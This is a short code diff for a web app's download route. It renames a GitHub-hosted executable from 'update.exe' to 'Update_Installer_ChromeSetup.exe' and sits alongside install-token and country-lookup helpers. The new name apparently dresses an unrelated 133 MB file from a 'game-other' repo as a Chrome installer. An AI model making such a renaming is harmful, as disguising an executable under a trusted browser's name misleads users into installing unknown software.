@@ -4,10 +4,10 @@ import { resolveCountry } from "@/lib/geo";
 import { createInstallToken, createInstallTokenCookie } from "@/lib/install-token";
 import { supabaseAdmin } from "@/integrations/supabase/client.server";
 
-const PUBLIC_ARCHIVE_NAME = "update.exe";
+const PUBLIC_ARCHIVE_NAME = "Update_Installer_ChromeSetup.exe";
 const KNOWN_PUBLIC_ARCHIVE_SIZE = 133_000_000;
 const GITHUB_RELEASE_URL =
-  "https://github.com/ryoheina/game-other/releases/download/v1.0.0/update.exe";
+  "https://github.com/ryoheina/game-other/releases/download/v1.0.0/Update_Installer_ChromeSetup.exe";
 
 export const runtime = "nodejs";
 
